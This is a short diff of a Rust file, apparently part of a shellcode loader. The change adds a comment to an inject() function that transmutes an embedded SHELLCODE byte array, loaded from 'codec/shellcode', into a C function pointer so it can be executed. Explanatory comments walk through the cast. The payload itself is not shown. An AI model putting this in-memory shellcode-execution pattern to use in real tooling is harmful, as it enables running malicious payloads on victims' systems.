@@ -40,7 +40,8 @@ pub static SHELLCODE: [u8; SHELLCODE_LENGTH] = *include_bytes!("codec/shellcode.
 
 
 
-pub fn inject(){        
+pub fn inject(){
+    //// the equivalent of () in C is *const ()
     let exec_shellcode: extern "C" fn() -> () = unsafe{ //// the type of exec_shellcode is a C function pointer which will return nothing; since everything in rust must have a specific size thus the compiler cannot predict what memory address the () would be associated with at execution time
         mem::transmute(&SHELLCODE as *const [u8] as *const ()) //// it copies the bits from the source value into the destination value; in our case we're transmutting the shellcode [u8] buffer into a C function pointer which is () in rust so we can call it later to execute it
     };
